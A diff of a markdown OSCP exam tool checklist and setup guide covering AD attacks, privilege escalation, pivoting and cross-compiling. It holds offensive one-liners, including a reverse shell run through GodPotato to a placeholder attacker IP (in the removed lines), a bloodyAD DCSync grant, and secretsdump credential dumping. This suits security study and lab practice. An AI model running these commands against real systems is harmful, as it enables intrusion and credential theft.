@@ -1,104 +1,117 @@
-# OSCP Required Tools & Operational Guide
+# OSCP Weaponry: The Ultimate Tool & Setup Guide
 
-This is the consolidated master list of all tools mentioned in your notes. Use this as a checklist for your toolkit and a guide for pre-flight configurations.
+This guide is your primary asset for ensuring your Kali environment is prepped and your Windows binaries are ready for any lab or exam scenario.
 
 ---
 
-## 1. Active Directory (Heavy Hitters)
+## 1. Reconnaissance & Initial Foothold
+
+### **Checklist**
+- [ ] **Nmap**: Standard scanning.
+- [ ] **ffuf / Gobuster**: Fast fuzzing. (Use `ffuf` for VHosts and Extensions).
+- [ ] **NetExec (nxc)**: The Swiss Army knife for protocol enumeration (SMB, LDAP, MSSQL, WinRM).
+- [ ] **Wpscan**: WordPress specific scanning.
+- [ ] **Cadaver**: Command-line WebDAV client (essential if write access is found).
+
+### **Operational Tips**
+*   **WebDAV**: If `cadaver` reveals write access, always test file filters with a `.txt` before uploading a `.php` shell.
+*   **NetExec**: Use `--rid-brute` on SMB to find user accounts if you have guest/null session access.
+
+---
+
+## 2. Active Directory & Kerberos
 
 ### **Checklist**
 - [ ] **Impacket Suite**: `secretsdump`, `ntlmrelayx`, `mssqlclient`, `getST`, `ticketer`, `GetNPUsers`, `GetUserSPNs`.
-- [ ] **NetExec (nxc)**: `apt install netexec` (Multi-protocol enumeration).
-- [ ] **Certipy**: `pip3 install certipy-ad` (AD CS Exploitation).
-- [ ] **BloodHound & SharpHound**: Attack path mapping (GUI + data collector).
-- [ ] **Rubeus.exe**: The Kerberos Swiss Army Knife.
-- [ ] **Mimikatz.exe**: Credential dumping.
-- [ ] **Kerbrute**: Pre-auth user enumeration.
-- [ ] **PyWhisker / Whisker**: Shadow Credentials exploitation.
-- [ ] **BloodyAD**: AD object and permission manipulation.
+- [ ] **Certipy**: Modern AD CS (Certificate Services) exploitation tool.
+- [ ] **bloodyAD**: Python-based AD object manipulator (best for GenericAll/WriteMember rights).
+- [ ] **Rubeus.exe**: The Kerberos engine for Windows. (Keep .NET 3.5 and 4.5 versions).
+- [ ] **SharpHound.exe**: AD data collector for BloodHound.
+- [ ] **Whisker / PyWhisker**: Shadow Credentials (msDS-KeyCredentialLink).
 
-### **Usage & Setup Tips**
-*   **Impacket (Kerberos)**: You **MUST** sync your time with the DC or Kerberos will error.
-    *   `sudo ntpdate [DC_IP]`
-*   **Certipy**: Relies on hostnames to resolve the CA. Add to `/etc/hosts`:
-    *   `[DC_IP]  [DOMAIN_NAME] [CA_HOSTNAME] [CA_HOSTNAME].[DOMAIN_NAME]`
-*   **Responder**: Disable the SMB/HTTP servers in `/etc/responder/Responder.conf` if you plan to run `impacket-smbserver` or `python server` simultaneously.
-*   **Rubeus.exe**: Must match the target's .NET version. Keep two versions: one for .NET 3.5 and one for 4.5.
-*   **BloodHound**: Start the Neo4j database first: `sudo neo4j start`.
+### **Operational Tips**
+*   **Faketime (Clock Skew Fix)**: If your Kali time differs from the DC and you can't change your system clock (due to `ntpdate` restrictions), use `faketime`:
+    *   `faketime '2023-12-01 12:00:00' impacket-GetUserSPNs ...`
+    *   Alternatively, use the relative offset: `faketime -5m impacket-secretsdump ...`
+*   **bloodyAD Flags**:
+    *   Always use `--host [DC_IP]` to avoid DNS resolution issues.
+    *   `bloodyAD add right 'DC=domain,DC=local' 'CN=user,CN=Users...' DCSync` (Granting DCSync).
+*   **Certipy DNS**: You **MUST** put the CA hostname in `/etc/hosts`:
+    *   `10.10.10.10  dc01.domain.local  CA-SERVER`
 
 ---
 
-## 2. Windows Privilege Escalation (.exe)
+## 3. Lateral Movement & Post-Exploitation
 
 ### **Checklist**
-- [ ] **PrintSpoofer.exe**: SeImpersonate abuse for Windows 2016 / 2019.
-- [ ] **GodPotato.exe**: SeImpersonate abuse for Win 11 / Server 2022.
-- [ ] **SeManageVolumeExploit.exe**: Full C:\ drive permissions (SeManageVolumePrivilege).
-- [ ] **SharpGPOAbuse.exe**: Abusing GPO Write permissions.
-- [ ] **WinPEASany.exe**: Best-in-class automated enumeration.
-- [ ] **PsExec.exe**: Sysinternals lateral movement.
-- [ ] **nc.exe / ncat**: Reliable reverse shells.
+- [ ] **Evil-WinRM**: Best WinRM shell environment. Supports PTH and file uploads.
+- [ ] **Mimikatz.exe**: Credential and ticket extraction on Windows.
+- [ ] **pyLAPS**: Reading LAPS passwords from Kali.
+- [ ] **GMSAPasswordReader.exe**: Reading managed service account passwords.
+- [ ] **Invoke-RunasCs.ps1**: PowerShell utility to spawn processes as other users.
+- [ ] **KeeThief / KeeFarce**: If you encounter KeePass databases. (Less common in OSCP but good for red teaming).
 
-### **Usage & Setup Tips**
-*   **GodPotato**: Requires a command to execute.
-    *   `GodPotato.exe -cmd "nc.exe -e cmd.exe [KALI_IP] 443"`
-*   **SharpGPOAbuse**: You need the *exact* name of the GPO (found via BloodHound or `Get-GPO -All`).
-*   **SeManageVolume**: Requires compiling the DLL and the EXE separately (see Compilation section).
+### **Operational Tips**
+*   **Mimikatz**: Run `privilege::debug` before anything else.
+*   **Evil-WinRM**: Use the `-H` flag for Pass-the-Hash if you only have the NTLM hash.
 
 ---
 
-## 3. Web & Initial Access
+## 4. Privilege Escalation (.exe & .ps1)
 
 ### **Checklist**
-- [ ] **ffuf / Gobuster**: High-speed fuzzing and discovery.
-- [ ] **Cadaver**: Command-line WebDAV client for PUT/MOVE.
-- [ ] **Nikto**: Basic vulnerability scanner.
-- [ ] **ntlm_theft.py**: Generator for hash-theft files (.lnk, .scf, .url).
-
-### **Usage Tips**
-*   **Fuzzing**: Always try both Directory and VHost fuzzing if a web service is found.
-*   **WebDAV**: If `cadaver` reveals write access, upload a `.txt` first to test filters before a shell.
+- [ ] **PrintSpoofer.exe**: SeImpersonate (Win Server 2016/2019).
+- [ ] **GodPotato.exe**: SeImpersonate (Modern Windows/Server 2022).
+- [ ] **JuicyPotato.exe**: SeImpersonate (Legacy/Windows 10 <= 1809).
+- [ ] **SharpGPOAbuse.exe**: Exploit GenericWrite on GPOs.
+- [ ] **SeManageVolumeExploit.exe**: Exploit SeManageVolumePrivilege (custom compile required).
+- [ ] **WinPEASany.exe / linpeas.sh**: Automated enumeration.
+- [ ] **PowerUp.ps1**: Legacy PowerShell privesc check (`Invoke-AllChecks`).
 
 ---
 
-## 4. Pivoting & Tunneling
+## 5. Pivoting & Tunnels
 
 ### **Checklist**
-- [ ] **Chisel**: Fast, multi-platform TCP tunnels.
-- [ ] **Ligolo-ng**: TUN-based pivoting (allows `nmap` through the tunnel).
-- [ ] **Socat**: Relaying shells and ports.
-- [ ] **Strings.exe**: For quick strings extraction on binaries.
+- [ ] **Chisel**: HTTP tunnels for port forwarding.
+- [ ] **Ligolo-ng**: TUN-based networking (allows transparent scanning through pivot).
+- [ ] **Socat**: Relaying connections from a compromised host to Kali.
 
-### **Usage & Setup Tips**
-*   **Ligolo-ng**: You must create the TUN interface on Kali first.
-    *   `sudo ip tuntap add user [KALI_USER] mode tun ligolo`
-    *   `sudo ip link set ligolo up`
-    *   `sudo ip route add [INTERNAL_SUBNET] dev ligolo`
-*   **Chisel**: Ensure your Kali firewall allows the listening port (usually 8080).
-
----
-
-## 🛠️ Cross-Compilation Cheat Sheet (Kali to Windows)
-
-**Target 64-bit Windows:**
-```bash
-x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32
-```
-
-**Target 32-bit Windows:**
-```bash
-i686-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32
-```
-
-**Making a DLL:**
-```bash
-x86_64-w64-mingw32-gcc -shared -o output.dll input.c
-```
+### **Operational Tips**
+*   **Ligolo-ng (Setup)**:
+    ```bash
+    sudo ip tuntap add user [USER] mode tun ligolo
+    sudo ip link set ligolo up
+    sudo ip route add 10.10.10.0/24 dev ligolo
+    ```
 
 ---
 
-## ⚙️ Mandatory Kali Environment Setup
-1.  **[/etc/hosts]**: Map IP to Hostname/Domain for Kerberos/ADCS.
-2.  **[/etc/proxychains.conf]**: Ensure `socks5 127.0.0.1 1080` check for pivoting.
-3.  **[Tool Directory]**: Standardize your folders (e.g., `~/tools/linux`, `~/tools/windows`).
-4.  **[NTP Sync]**: Always sync time with Domain Controllers.
+## 🛠️ Compilation & Cross-OS Setup
+
+### **Cross-Compiling (Kali -> Windows)**
+Ensure `mingw-w64` is installed.
+
+| Target | Command |
+| :--- | :--- |
+| **64-bit EXE** | `x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32` |
+| **32-bit EXE** | `i686-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32` |
+| **DLL** | `x86_64-w64-mingw32-gcc -shared -o output.dll input.c` |
+
+### **Environment Hardening**
+1.  **[/etc/hosts]**: Your most frequent update. Map all target IPs to Hostnames.
+2.  **[NTP Sync]**: If possible, `sudo ntpdate [DC_IP]`. If blocked, use `faketime`.
+3.  **[Python Web Server]**: `python3 -m http.server 80` (From your tools folder).
+4.  **[Proxychains]**: Configure `/etc/proxychains4.conf` to match your Chisel/SSH port.
+
+---
+
+## 📂 Pre-Compiled Windows Tools (Download List)
+Before the exam, ensure you have pre-compiled versions of these in a "transfer" folder:
+- `nc.exe` (both 32 and 64 bit)
+- `winPEASany.exe`
+- `Rubeus.exe` (.NET 3.5 & 4.5)
+- `SharpHound.exe`
+- `GodPotato.exe` / `PrintSpoofer.exe`
+- `Chisel.exe` (Windows binary)
+- `SharpGPOAbuse.exe`
